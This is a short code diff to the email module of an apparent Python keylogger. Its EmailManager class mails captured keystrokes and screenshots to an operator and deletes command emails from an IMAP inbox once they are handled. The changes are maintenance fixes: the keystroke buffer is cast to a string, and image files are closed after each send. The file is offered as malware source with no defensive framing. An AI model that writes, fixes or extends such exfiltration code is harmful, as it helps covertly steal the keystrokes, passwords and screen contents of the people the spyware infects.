@@ -92,7 +92,7 @@ class EmailManager:
         msg['subject'] = self.id + "'s keylog info"
         msg['from'] = self.email
         try:
-            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[+] Keys: \n\n" + self.keys + "\n\n[*] Screenshots: ")
+            msg.set_content("[*] Date: " + str(datetime.datetime.now()) + "\n[+] Keys: \n\n" + str(self.keys) + "\n\n[*] Screenshots: ")
         except Exception as e:
             print(f"ERROR: {e}")
 
@@ -106,6 +106,7 @@ class EmailManager:
         except Exception as e:
             print(f"ERROR: {e}")
         self.send_email(msg)
+        image.close()
         print("email sent")
 
         imap_server.store(msg_num, "+FLAGS", "\\Deleted")
@@ -135,6 +136,7 @@ class EmailManager:
         msg.attach(att)
         self.send_email(msg)
         print("email sent")
+        image.close()
 
         imap_server.store(msg_num, "+FLAGS", "\\Deleted")
         print("email prompt removed")
@@ -185,6 +187,7 @@ class EmailManager:
         att.add_header('Content-Disposition', 'attachment', filename=str(image))
         msg.attach(att)
         self.send_email(msg)
+        image.close()
         print("setup email sent")
 
     def send_text(self, imap_server, msg_num, text):
